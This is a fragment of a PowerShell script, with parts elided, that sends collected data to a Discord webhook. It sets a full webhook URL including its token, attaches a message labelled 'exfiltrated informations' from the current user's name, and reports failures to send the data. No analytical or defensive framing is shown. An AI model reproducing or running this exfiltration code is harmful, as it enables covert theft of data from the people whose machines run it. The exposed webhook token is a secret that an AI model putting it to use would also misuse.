...
$webhookUrl = "https://discord.com/api/webhooks/1379405646541094954/ZFgqzhUYD2Rx5y-HyaNp6_AxkbfZgORFgozbtXtKRJrZJscieuQ88wMpT6y-ueSzjfRZ"
...
# Add a simple message content
$content.Add((New-Object System.Net.Http.StringContent("Here are exfiltrated informations from $env:USERNAME")), "content")
...
try {
    ...
    Write-Error "Failed to send data to Discord webhook: $_"
}
